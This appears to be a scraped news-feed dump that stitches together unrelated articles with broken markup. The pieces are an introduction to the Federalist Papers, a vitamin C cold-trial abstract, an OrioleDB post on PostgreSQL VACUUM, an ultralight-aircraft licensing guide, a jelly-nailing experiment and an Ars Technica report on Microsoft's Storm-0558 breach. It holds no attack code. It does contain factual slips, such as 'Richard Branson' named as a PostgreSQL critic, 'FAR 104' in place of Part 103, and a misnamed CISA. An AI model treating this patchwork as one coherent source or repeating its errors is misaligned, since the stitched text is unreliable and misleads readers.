				<p><em>The Federalist</em>, commonly referred to as the Federalist Papers, is a series of 85 essays written by Alexander Hamilton, John Jay, and James Madison between October 1787 and May 1788. The essays were published anonymously, under the pen name "Publius," in various New York state newspapers of the time.</p>

<p>The Federalist Papers were written and published to urge New Yorkers to ratify the proposed United States Constitution, which was drafted in Philadelphia in the summer of 1787. In lobbying for adoption of the Constitution over the existing Articles of Confederation, the essays explain particular provisions of the Constitution in detail. For this reason, and because Hamilton and Madison were each members of the Constitutional Convention, the Federalist Papers are often used today to help interpret the intentions of those drafting the Constitution.</p>

<p>The Federalist Papers were published primarily in two New York state newspapers: <em>The New York Packet</em> and <em>The Independent Journal</em>. They were reprinted in other newspapers in New York state and in several cities in other states. A bound edition, with revisions and corrections by Hamilton, was published in 1788 by printers J. and A. McLean. An edition published by printer Jacob Gideon in 1818, with revisions and corrections by Madison, was the first to identify each essay by its author's name. Because of its publishing history, the assignment of authorship, numbering, and exact wording may vary with different editions of <em>The Federalist</em>.</p>

<p>The electronic text of <em>The Federalist</em> used here was compiled for Project Gutenberg by scholars who drew on many available versions of the papers.</p>

<p>One printed edition of the text is <em>The Federalist</em>, edited by Jacob E. Cooke (Middletown, Conn., Wesleyan University Press, 1961). Cooke's introduction provides background information on the printing history of The Federalist; the information provided above comes in part from his work.</p>

<p>This web-friendly presentation of the original text of the Federalist Papers (also known as The Federalist) was obtained from the e-text archives of Project Gutenberg. Any irregularities with regard to grammar, syntax, spelling, or punctuation are as they exist in the original e-text archives.</p>

    <p>
      
        <strong>
          Objective:
        </strong>
      
      To determine the effect of large doses of vitamin C in the treatment of the common cold.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Study design:
        </strong>
      
      Double-blind, randomised clinical trial with four intervention arms: vitamin C at daily doses of 0.03g ("placebo"), 1 g, 3g, or 3g with additives ("Bio-C") taken at onset of a cold and for the following two days.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Participants and setting:
        </strong>
      
      400 healthy volunteers were recruited from staff and students of the Australian National University, Canberra, ACT, between May 1998 and November 1999. The trial continued for 18 months.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Interventions:
        </strong>
      
      Participants were instructed to commence medication when they had experienced early symptoms of a cold for four hours, and to record daily their symptoms, severity, doctor visits and use of other medications.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Main outcome measures:
        </strong>
      
      Duration of symptoms and cold episodes; cumulative symptom severity scores after 7, 14 and 28 days; doctor visits; and whether participants guessed which medication they were taking.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Results:
        </strong>
      
      149 participants returned records for 184 cold episodes. No significant differences were observed in any measure of cold duration or severity between the four medication groups. Although differences were not significant, the placebo group had the shortest duration of nasal, systemic and overall symptoms, and the lowest mean severity score at 14 days, and the second lowest at 7 and 28 days.
    </p>
  

  


              
                


  
    <p>
      
        <strong>
          Conclusions:
        </strong>
      
      Doses of vitamin C in excess of 1 g daily taken shortly after onset of a cold did not reduce the duration or severity of cold symptoms in healthy adult volunteers when compared with a vitamin C dose less than the minimum recommended daily intake.
    </p>

            <description><![CDATA[<p>URL: <a href="https://www.orioledata.com/blog/no-more-vacuum-in-postgresql/">https://www.orioledata.com/blog/no-more-vacuum-in-postgresql/</a>, See on <a href="https://news.ycombinator.com/item?id=36740921">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>PostgreSQL, a powerful open-source object-relational database system, has been lauded for its robustness, functionality, and flexibility. However, it is not without its challenges – one of which is the notorious VACUUM process. However, the dawn of a new era is upon us with <a href="https://github.com/orioledb/orioledb">OrioleDB</a>, a novel engine designed for PostgreSQL that promises to eliminate the need for the resource-consuming VACUUM.</p>
<h3 id="the-terrifying-tale-of-vacuum-in-postgresql">The Terrifying Tale of VACUUM in PostgreSQL</h3>
<p>The VACUUM process in PostgreSQL is a historical artifact that traces its roots back to the Berkley Postgres project, which implemented a concept known as infinite time-travel. The concept, while innovative at the time, was eventually dropped by the PostgreSQL community. However, it led to the implementation of a Multi-Version Concurrency Control (MVCC) system prone to table bloat.</p>
<p>The PostgreSQL MVCC system, while beneficial for handling concurrent transactions, introduced the need for manual vacuuming. This was a process in which old, unneeded data was purged to free up space and ensure efficient database operations. Manual vacuuming, however, was a labor-intensive task and a potential source of inefficiencies in the system.</p>
<p>The PostgreSQL community, in their continued efforts to improve the system, introduced autovacuum - an automatic vacuuming process designed to alleviate the need for manual vacuuming. This was a significant step forward, but it was not a perfect solution. The autovacuum process, while automatic, still consumed substantial system resources. This is  one of the reasons why <a href="https://www.uber.com/en-US/blog/postgres-to-mysql-migration/">Uber decided to migrate from PostgreSQL to MySQL</a> and one of the <a href="https://rbranson.medium.com/10-things-i-hate-about-postgresql-20dbab8c2791">10 things that Richard Branson hates about PostgreSQL</a>.</p>
<p>Further enhancements came with the implementation of Heap-Only Tuples (HOT) updates and microvacuum, both significant improvements that reduced the need for full table vacuums. However, despite these advancements, the VACUUM process still remained a resource-intensive operation. Furthermore, PostgreSQL tables remained prone to bloat, an issue that continues to plague many users today. This is the <a href="https://ottertune.com/blog/the-part-of-postgresql-we-hate-the-most/">part of PostgreSQL that the team at OtterTune hates the most</a>.</p>
<p>Despite these challenges, many organizations and developers continue to use and support PostgreSQL. Its robustness, extensibility, and strong community are just a few reasons why. For instance, <a href="https://ottertune.com/blog/yes-postgresql-has-problems-but-were-sticking-with-it/">OtterTune, despite acknowledging PostgreSQL’s problems, has decided to stick with it</a>. They explain their reasons in a separate blog post, highlighting the importance of considering the overall benefits and drawbacks of a system before making a decision.</p>
<h3 id="enter-orioledb-the-engine-of-the-future">Enter OrioleDB: The Engine of the Future</h3>
<p>OrioleDB is a groundbreaking new engine for PostgreSQL, developed with a primary goal: to save tables from bloat and eliminate the need for regular maintenance like VACUUM. It achieves this through the implementation of row-level and block-level undo logs, as well as automatic page merging.</p>
<p>The undo logs at the row and block level provide a more granular level of control, allowing for more efficient handling of data changes. The automatic page merging feature works tirelessly in the background to consolidate fragmented data, further enhancing the efficiency of the system.</p>
<figure><img src="https://www.orioledata.com/images/techniques.png" width="800px">
</figure>

<p>The figure above illustrates this techniques. Row-level undo log allows in-place updates. Block-level undo log allows to evict tuples, which are deleted but visible to some transactions, from the primary storage leaving more space for new tuples. Automatic merge of sparse pages saves tables and indexes from bloat after many deletes.</p>
<p>The implementation of these features in OrioleDB results in a system that requires less manual intervention, consumes fewer resources, and is less prone to table bloat. This promises a significant improvement in the performance and user experience of PostgreSQL.</p>
<h3 id="benchmarks">Benchmarks</h3>
<p>The following synthetic benchmark can illustrate the OrioleDB advantages of the above as well as some others.  The following initialization script creates a table and 5 indexes on it.</p>
<div><pre tabindex="0"><code data-lang="sql"><span>CREATE</span> <span>TABLE</span> test (
    id integer <span>primary</span> <span>key</span>,
    value1 float8 <span>not</span> <span>null</span>,
    value2 float8 <span>not</span> <span>null</span>,
    value3 float8 <span>not</span> <span>null</span>,
    value4 float8 <span>not</span> <span>null</span>,
    ts <span>timestamp</span> <span>not</span> <span>null</span>
);

<span>CREATE</span> <span>INDEX</span> test_value1_idx <span>ON</span> test (value1);
<span>CREATE</span> <span>INDEX</span> test_value2_idx <span>ON</span> test (value2);
<span>CREATE</span> <span>INDEX</span> test_value3_idx <span>ON</span> test (value3);
<span>CREATE</span> <span>INDEX</span> test_value4_idx <span>ON</span> test (value4);
<span>CREATE</span> <span>INDEX</span> test_ts_idx <span>ON</span> test (ts);
</code></pre></div><p>The pgbench script is given below.  It’s an upsert that performs sparse updates of the one of indexes on conflict.  The sparse update causes this index to bloat when using regular heap PostgreSQL tables.</p>
<div><pre tabindex="0"><code data-lang="sql"><span>\</span><span>set</span> id random(<span>1</span>, <span>10000000</span>)
<span>INSERT</span> <span>INTO</span> test <span>VALUES</span>(:id, random(), random(), random(), random(), now() <span>-</span> random() <span>*</span> random() <span>*</span> <span>1800</span> <span>*</span> interval <span>'1 second'</span>)
<span>ON</span> CONFLICT (id) <span>DO</span> <span>UPDATE</span> <span>SET</span> ts <span>=</span> now();
</code></pre></div><p>This benchmark illustrates the following advantages of OrioleDB design.</p>
<ol>
<li>Thanks to undo log and in-place updates, OrioleDB needs to update only one index, whose value has been changed.  With the PostgreSQL heap engine, the update of a single indexed field disables HOT, so all indexes get updated.</li>
<li>Automatic page merge saves sparse index from bloat.  Sparse pages are automatically merged.</li>
<li>Row-level WAL takes much less space than block-level WAL.  That saves IOPS on WAL writing.</li>
</ol>
<p>See the results of the benchmark on the graphs below.</p>
<figure><img src="https://www.orioledata.com/images/bloat.png" width="800px">
</figure>

<p>As the cumulative result of the improvements discussed above, OrioleDB provides:</p>
<ul>
<li><strong>5X higher TPS</strong>,</li>
<li><strong>2.3X less CPU load per transaction</strong>,</li>
<li><strong>22X less IOPS per transaction</strong>,</li>
<li><strong>No table and index bloat</strong>.</li>
</ul>

<p>With the introduction of OrioleDB, the PostgreSQL community stands on the brink of a new era where the haunting specter of VACUUM is a thing of the past. This novel engine offers a compelling solution to one of PostgreSQL’s longest-standing challenges, promising users increased efficiency and fewer maintenance headaches.</p>

            <description><![CDATA[<p>URL: <a href="https://pilotinstitute.com/flying-without-a-license/">https://pilotinstitute.com/flying-without-a-license/</a>, See on <a href="https://news.ycombinator.com/item?id=36740400">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Flying is expensive and cost-prohibitive for most people who are not willing or unable to invest the time and money into obtaining a <a href="https://pilotinstitute.com/non-us-citizen-pilot-license/" target="_blank" rel="noreferrer noopener">pilot’s license</a>. However, there are still some options available to those who want to experience the thrill of flying without having to go through the long and expensive process of obtaining a license.</p>
<p><strong>Aircraft under the FAA’s 14 CFR Part 103 ultralight category does not require a <a href="https://pilotinstitute.com/pilot-license-benefits/" target="_blank" rel="noreferrer noopener">pilot’s license</a> to fly. There are helicopters, fixed-wing planes, and gliders that fall under this category that can be flown without a license, but you will require additional training to fly them safely. A pilot’s license is necessary to fly larger aircraft.</strong> </p>
<p>Let’s explore how you can take to the skies without a pilot’s license for a fraction of the cost!</p>

<p>You can fly certain planes without a pilot’s license.</p>
<p>Although you typically need a license to fly an aircraft, there are some exceptions for smaller, lighter aircraft. Most planes that don’t require a license to fly are small, single-seat aircraft with small engines.</p>
<p>Unlike aircraft that need a licensed pilot, these planes can be piloted without any certification because they are easy to fly, stay close to the ground, take off and land slowly, and, perhaps most importantly, don’t carry passengers. </p>
<p>Remember that if you try to fly an aircraft that requires a license to operate, you’ll find yourself in significant legal trouble.</p>
<h2>How to Fly a Plane without a License</h2>
<p>According to 14 CFR Part 103.1 (FAR 103), you may only fly an aircraft without a license according to the following conditions:</p>
<ul>
<li>The aircraft has one seat (no passengers allowed).</li>
<li>The aircraft may only be flown for recreational or sports purposes (no commercial operations).</li>
<li>The aircraft must weigh less than 155 pounds if it is not powered (it has no engine).</li>
<li>The aircraft must weigh less than 254 pounds (when empty) if it is powered (has an engine).</li>
<li>The aircraft must have a fuel capacity of no more than 5 U.S. gallons.</li>
<li>The aircraft must not be able to exceed 55 knots at full power in level flight.</li>
<li>The aircraft’s stall speed must not exceed 24 knots (power-off).</li>
</ul>
<p>Practically speaking, this means that you can only fly small planes by yourself at limited speeds and only if you’re a recreational flyer.</p>
<p>You don’t need a license to operate these aircraft because they’re easy enough to fly that the Federal Aviation Administration (FAA) doesn’t see the need to regulate them.</p>
<p>In certain areas, the law requires extra professional training before flying these types of aircraft. However, you won’t need a pilot’s license to operate them. </p>
<p>One of the main benefits of flying planes that meet these criteria is that you can experience flight without spending money on expensive flying lessons or ground school.</p>
<h2>Planes You Can Fly Without a Pilot’s License</h2>
<p>Let’s look at popular ultralight aircraft that do not require a pilot’s license to fly.</p>
<h3>Phantom X1</h3>
<figure><img decoding="async" loading="lazy" width="1024" height="567" src="https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-1024x567.jpg" alt="Phantom X1" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-1024x567.jpg 1024w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-300x166.jpg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-768x426.jpg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-540x299.jpg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-494x274.jpg 494w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-274x152.jpg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1-325x180.jpg 325w, https://pilotinstitute.com/wp-content/uploads/2022/12/Phantom-X1.jpg 1377w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>
<p>The Phantom X1 is a tractor-configuration (i.e., front engine), high-wing, ultralight aircraft. Over 2000 Phantom X1 aircraft have been built since 2000, making it one of the most popular Part 103 ultralight aircraft in production today.</p>
<p>The 1980s design has proved popular and versatile, with many variants of the X1 produced, such as the X1E, X2, and Phantom I series.</p>
<p>The Phantom X1 features significant maneuverability and was initially designed as an aerobatic training aircraft. It was not marketed as an aerobatic aircraft due to legal considerations.</p>
<p>The factory options include brakes, a complete airframe parachute, and various Rotax engines from 40 to 64 hp (30 to 48 kW). The manufacturer estimates that it would take the average person 40 hours to assemble the Phantom X1 kit. </p>
<p>The best part is the Phantom’s attractive price tag. You can purchase a fully-built Phantom X1 for around $14,000.</p>
<h3>Aerolite 103</h3>

<p>The Aerolite 103 is a single-seat, fixed-wing ultralight with an endurance of 2 hours.</p>
<p>The aircraft was updated and production resumed in 2013 after the company when out of business in 2005. </p>
<p>The Aerolite 103 can be purchased for around $19,000 fully assembled.</p>
<h3>Hummel Ultracruiser</h3>
<figure><img decoding="async" loading="lazy" width="900" height="677" src="https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser.jpeg" alt="" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser.jpeg 900w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-300x226.jpeg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-768x578.jpeg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-540x406.jpeg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-437x329.jpeg 437w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-274x206.jpeg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/hummel-ultracruiser-239x180.jpeg 239w" sizes="(max-width: 900px) 100vw, 900px"></figure>

<p>The Hummel Ultracruiser (also known as the Ultra Cruiser and UltraCruiser) is an all-metal ultralight aircraft fully compliant with FAR 104. </p>
<p>It is the only all-metal ultralight aircraft, and over 100 have been built since 2001.</p>
<h3>Mosquito XEL</h3>
<figure><img decoding="async" loading="lazy" width="900" height="550" src="https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL.jpg" alt="" srcset="https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL.jpg 900w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-300x183.jpg 300w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-768x469.jpg 768w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-540x330.jpg 540w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-494x302.jpg 494w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-274x167.jpg 274w, https://pilotinstitute.com/wp-content/uploads/2022/12/MosquitoAviationXEL-295x180.jpg 295w" sizes="(max-width: 900px) 100vw, 900px"><figcaption>Image from <a href="https://commons.wikimedia.org/wiki/User:FlugKerl2">FlugKerl2</a></figcaption></figure>
<p>The mosquito XEL is a single-seat helicopter that doesn’t require a license to fly! It has an endurance of 1 hour and is equipped with floats. </p>
<p>It is more expensive than its fixed-wing ultralight counterparts at $53,000 fully built.</p>
<h2>What to Look for When Buying an Ultralight Aircraft</h2>
<p>When buying an ultralight aircraft, you should primarily focus on the empty weight, fuel capacity, and speed. There are many great options available in this category.</p>
<p>Because some manufacturers might falsely claim that their aircraft are Part 103 compliant, potential buyers need to be aware of these requirements. </p>
<p>The aircraft owner is responsible for ensuring the plane meets all FAA regulations. The penalties can be severe if an inspector finds that the aircraft does not comply with these regulations.</p>
<h2>What Happens If You Fly a Plane without a Pilot’s License?</h2>
<p>You could face severe penalties if you fly a plane that doesn’t meet the Part 103 Ultralight category requirements.</p>
<p>Depending on how aware you were of the transgression, you could even face prison time.</p>
<p>If you fly a plane without a license, the legal consequences can be up to $250,000 in fines and three years in prison. </p>
<p>If you cause injury or destruction to property, your punishment could be even more severe.</p>
<h2>Conclusion</h2>
<p>If you’re looking for a great way to get into aviation without breaking the bank, ultralight aircraft are definitely worth checking out. In addition to being relatively affordable, they don’t require a pilot’s license, and they’re also incredibly fun and easy to fly. </p>
<p>So whether you’re just getting started in aviation or you’ve been flying for years, ultralights are a great option that’s sure to provide plenty of enjoyment.</p>

            <link>https://greem.co.uk/otherbits/jelly.html</link>
            <guid>36740357</guid>
            <pubDate>Sat, 15 Jul 2023 19:53:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://greem.co.uk/otherbits/jelly.html">https://greem.co.uk/otherbits/jelly.html</a>, See on <a href="https://news.ycombinator.com/item?id=36740357">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
We've all heard the old saying "it's like nailing jelly to a wall" to describe
a task that is very difficult or impossible. But is our view of the difficulty
of this task justified? Has anybody actually tried nailing jelly to a wall? In
this experiment I attempt to establish, one way or the other, the validity of
the old proverb.
</p><div>

<h2>Materials</h2>
<p>
I sourced the following materials from Sainsbury's and Focus.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/materials.jpg" alt="Hammer, nails, plank, jelly">
</p>
<p>
They are: a 16oz claw hammer, a 200g pack of 3" (75mm) round wire nails, a
selection of 135g packs of Hartley's jelly cubes, and a plank of wood,
dimensions 850x200x18mm (approx. 33½"x7¾"x¾"). The plank of
wood will play the part of the "wall". The type of wood, and its exact
dimensions, are not important.
</p>
<p>
The length of the nails is important. Specifically, the nails should be longer
than the depth of the bowl intended for use as the jelly mould. This is to
enable the nail to go right through the finished jelly and into the wall without
the nail first disapparing into the jelly.
</p>
<p>
The picture below shows the proposed jelly mould (an ordinary dessert
bowl) and one of the nails next to it for comparison purposes.

<h2>A first attempt</h2>
<p>
A box of jelly, as purchased from the supermarket, contains twelve joined
"cubes". The orange flavour is shown below. This is "concentrated" or "neat"
jelly; the idea is that water is added to produce actual jelly. Of course,
these cubes are much more viscous than the diluted mixture produced by adding
water. Therefore, it should be easier to nail the concentrated cubes to the
wall than the actual jelly.
</p>
<p>

</p>
<p>
In fact, the jelly didn't even need a nail to stay on the wall. It just stuck
there. For good measure, I drove a nail through it. The jelly held in
place.

</p>
<p>
This is called "cheating".
</p>
<hr>
<h2>Making the jelly</h2>
<p>
My first attempt being somewhat against the spirit of the proverb, I decided
to repeat the experiment with proper jelly. The procedure for making jelly from
the jelly cubes is documented on the reverse of the jelly boxes; a summary is
given here.
</p>
<p>
The picture below shows the equipment required: some jelly cubes (lime this
time), a measuring jug, and some boiling water.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_prep.jpg" alt="Jelly, jug, kettle">
</p>
<p>
Do not eat any of the neat jelly cubes, no matter how nice they look. They're
incredibly sweet and probably addictive; if you eat them all you won't have
any left for the experiment.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_cubes_full.jpg" alt="Jelly cubes before I've
eaten some">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_cubes_eaten.jpg" alt="Jelly cubes after I've
eaten some">
</p>

<p>
Pour half a pint (284ml) of boiling water into a jug, and add the cubes. Stab
the cubes indiscriminately until they've all dissolved. Then add another half
pint of cold water, so the jug contains a pint (568ml) of jelly mix.
</p>
<p>
Given that the intention is that this jelly be nailed to a wall, we might
intuitively get better results if we add less water than required, in order to
give a thicker and presumably sturdier mix. However, in this experiment the
jelly will be prepared according to the instructions on the packet to ensure a
fair test.
</p>
<p>

<img src="https://greem.co.uk/otherbits/jellypics/jug_full.jpg" alt="Full jug">
</p>

<p>
Pour the jelly mix into whatever is being used for the jelly mould. In this
case, as mentioned before, we are using a simple dessert bowl. The only
restriction on the type of mould used is that its depth should be less than the
length of the nails.
</p>
<p>
If you reproduce this experiment, you will probably find that there is an
irritatingly small amount of jelly mixture left over in the jug once the mould
is full. Pour this footling amount of jelly into a glass, and place it in the
fridge alongside the bowl. For maximum confusion, don't tell any of your
housemates about it.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_bowl.jpg" alt="Jelly in bowl, and some left over in jug">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_fridge.jpg" alt="Jelly in fridge">
</p>
<p>
Finally, leave the jelly to set overnight.
</p>
<hr>
<h2>Nailing it to a wall</h2>
<p>
When the jelly has set, cover it with a plate, upturn the entire arrangement,
and carefully lift the bowl off the jelly. Then realise that the jelly is still
stuck to the bowl. Hit the bowl with a spoon a few times (to no avail) before
attacking the edges of the jelly with a thin sharp knife to loosen it.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_set.jpg" alt="Jelly on a plate">
</p>
<p>
The logical next step would be to pick up the jelly and nail it to some surface
perpendicular to the floor. Unfortunately, the first of these steps was
impossible; trying to pick up the jelly with bare hands resulted in its
partial disintegration. So, I opted for a compromise; I got the jelly back in
the bowl, and upturned it directly onto the plank, while it was horizontal.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_hand.jpg" alt="Can't pick up the jelly!">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_in_bowl_above_plank.jpg" alt="Putting the jelly on the plank">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_on_plank.jpg" alt="Jelly on the plank">
</p>
<p>
With the plank horizontal, I drove a nail through the centre of the jelly and
into the plank.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/nailing_jelly_to_the_wall.jpg" alt="Me nailing jelly to the plank">
</p>
<p>
I then added a few more nails to hold the jelly in place. Unfortunately, even
with nine nails in it, the jelly was starting to break around the nails when
the plank was tilted.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_five_nails.jpg" alt="Jelly with five nails in it">
<img src="https://greem.co.uk/otherbits/jellypics/jelly_nine_nails.jpg" alt="Jelly with nine nails in it">

<img src="https://greem.co.uk/otherbits/jellypics/jelly_nine_nails_breaking.jpg" alt="Jelly with nine nails in it, falling to bits">
</p>
<p>
Seeing nothing better to do, I added three more nails at strategic points. When
the plank was tilted, half the jelly broke off completely and fell to the floor.
The weak points seemed to be near the nails.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_twelve_nails.jpg" alt="Jelly with twelve nails in it">
</p>
<p>

</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_gloop.jpg" alt="Jelly half fallen off again">
</p>
<p>
The jelly's structural integrity now having been seriously compromised, the rest
of the jelly followed about half a minute later. This attempt at nailing jelly
to a wall had therefore resulted in quite a convincing failure.
</p>
<hr>
<h2>But wait...</h2>
<p>
I suddenly remembered that I had more jelly. The glass into which I poured the
excess from the jug was still sitting in the fridge. I retrieved it and
extricated the jelly. Perhaps a smaller amount of jelly would nail to the wall
easier?
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/jelly_and_glass.jpg" alt="The jelly from the glass">
</p>
<p>
Taking no chances, I not only nailed the jelly to the plank using five nails,
but also added a crescent of eight nails below the jelly to catch any wayward
lumps.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_nailed_1.jpg" alt="Small piece of jelly nailed to the wall">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_nailed_2.jpg" alt="Small piece of jelly nailed to the wall">
</p>
<p>
This worked for approximately half a minute. Unfortunately, although the jelly
that fell off was briefly caught in the crescent arrangement of nails, it fell
through the gaps after a small amount of time.
</p>
<p>
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_1.jpg" alt="Small piece of jelly breaking up">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_2.jpg" alt="Small piece of jelly breaking up">
<img src="https://greem.co.uk/otherbits/jellypics/small_jelly_breaking_3.jpg" alt="Small piece of jelly breaking up">
</p>
<p>
Before long, there were only trace amounts of jelly left on the wall.
</p>
<hr>
<h2>Conclusion</h2>
<p>
Given some jelly mixed according to standard procedures and a vertical wall, it
is not possible to nail the former to the latter and have it stay there for any
significant amount of time. Furthermore, these experiments were conducted by
nailing the jelly to a horizontal surface which was then gradually tilted.
Nailing jelly to a wall while the wall is vertical is an intractable problem in
itself due to the difficulty in picking up jelly with the hands without it
disintegrating.
</p>
<p>
Even using many nails to construct a receptacle for the purpose of catching the
jelly, which is not technically "nailing it to the wall", resulted in failure.
This was because the gaps between the nails afford to the jelly an easy means of
egress from the receptacle.
</p>
<p>
Further research into the area might involve the nailing to the wall of a
stronger jelly mix. Alternatively, the "wall" could be placed, nails first, into
the jelly while it's setting, to allow the jelly to set around the nails. Then
in the morning the bowl can be removed, leaving the jelly nailed to the wall.
</p>
<p>
The old proverb, then, is justified, and the reader may say that an impossible
or near-impossible task is "like nailing jelly to the wall" safe in the
knowledge that the assertion has some scientific evidence to corroborate it.

<p>On Friday, Microsoft attempted to explain the cause of a breach that gave hackers working for the Chinese government access to the email accounts of 25 organizations—reportedly including the US Departments of State and Commerce and other sensitive organizations.</p>
<p>In a <a href="https://www.microsoft.com/en-us/security/blog/2023/07/14/analysis-of-storm-0558-techniques-for-unauthorized-email-access/">post on Friday</a>, the company indicated that the compromise resulted from three exploited vulnerabilities in either its Exchange Online email service or <a href="https://azure.microsoft.com/en-us/products/active-directory/">Azure Active Directory</a>, an identity service that manages single sign-on and multifactor authentication for large organizations. Microsoft’s Threat Intelligence team said that Storm-0558, a China-based hacking outfit that conducts espionage on behalf of that country’s government, exploited them starting on May 15. Microsoft drove out the attackers on June 16 after a customer tipped off company researchers of the intrusion.</p>
<h2>Above all else: Avoid the Z-word</h2>
<p>In standard parlance among security professionals, this means that Storm-0558 exploited zero-days in the Microsoft cloud services. A “zero-day” is a vulnerability that is known to or exploited by outsiders before the vendor has a patch for it. “Exploit” means using code or other means to trigger a vulnerability in a way that causes harm to the vendor or others.</p>
<p>While both conditions are clearly met in the Storm-0558 intrusion, Friday’s post and <a href="https://msrc.microsoft.com/blog/2023/07/microsoft-mitigates-china-based-threat-actor-storm-0558-targeting-of-customer-email/">two</a> <a href="https://blogs.microsoft.com/on-the-issues/2023/07/11/mitigation-china-based-threat-actor/">others</a> Microsoft published Tuesday, bend over backward to avoid the words “vulnerability” or “zero-day.” Instead, the company uses considerably more amorphous terms such as “issue,” “error,” and “flaw” when attempting to explain how nation-state hackers tracked the email accounts of some of the company's biggest customers.</p>                                            
                                                        
<p>“In-depth analysis of the Exchange Online activity discovered that in fact the actor was forging Azure AD tokens using an acquired Microsoft account (MSA) consumer signing key,” Microsoft researchers wrote Friday. “This was made possible by a validation error in Microsoft code.”</p>
<p>Later in the post, the researchers said that Storm-0558 acquired an inactive signing key used for consumer cloud accounts and somehow managed to use it to forge tokens for Azure AD, a supposedly fortified cloud service that, in effect, stores the keys that thousands of organizations use to manage logins for accounts on both their internal networks and cloud-based ones.</p>
<p>“The method by which the actor acquired the key is a matter of ongoing investigation,” the post stated. “Though the key was intended only for MSA accounts, a validation issue allowed this key to be trusted for signing Azure AD tokens.”</p>
<p>Two paragraphs later, Microsoft said that Storm-0558 used the forged token to gain access to Exchange email accounts through a programming interface for Outlook Web Access (OWA). The researchers wrote:</p>
<blockquote><p>Once authenticated through a legitimate client flow leveraging the forged token, the threat actor accessed the OWA API to retrieve a token for Exchange Online from the GetAccessTokenForResource API used by OWA. The actor was able to obtain new access tokens by presenting one previously issued from this API due to a design flaw. This flaw in the GetAccessTokenForResourceAPI has since been fixed to only accept tokens issued from Azure AD or MSA respectively. The actor used these tokens to retrieve mail messages from the OWA API.</p></blockquote>
<p>A plain-English summary of the event would seem to be: Microsoft has patched three vulnerabilities in its cloud service that were discovered after Storm-0558 exploited them to gain access to customer accounts. It would also be helpful if Microsoft provided a tracking designation under the CVE (Common Vulnerabilities and Exposures) system the way other cloud companies do. So why doesn’t Microsoft do the same?</p>                                            
                                                        
<p>“I don't think Microsoft ever acknowledges vulnerabilities in their cloud services (also there's no CVEs for cloud), and you don't say breach at Microsoft,” independent researcher Kevin Beaumont <a href="https://cyberplace.social/@GossiTheDog/110713723694545488">said on Mastodon</a>. “They did say ‘exploit’ in the original MSRC blog in relation to Microsoft's cloud services, and you exploit a vulnerability. So I think it's fair to say that, yes, they had vuln(s).”</p>

<p>Microsoft issued the following comment: "We don’t have any evidence that the actor exploited a 0day." Microsoft didn't elaborate. In one of the two posts published on Tuesday, Microsoft said: "The actor exploited a token validation issue to impersonate Azure AD users and gain access to enterprise mail." Ars has asked for a clarification of exactly what was exploited by the threat actor.</p>
<h2>Pay-to-play security</h2>
<p>Besides being opaque about the root cause of the breach and its own role in it, Microsoft is under fire for withholding details that some of the victims could have used to detect the intrusion, something critics have called “pay-to-play security.” <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-193a">According to</a> the US Cybersecurity and Information Security Agency, one federal agency that was breached by Storm-0558, it discovered the intrusion through audit logs that track logins and other important events affecting customers’ Microsoft cloud events.</p>
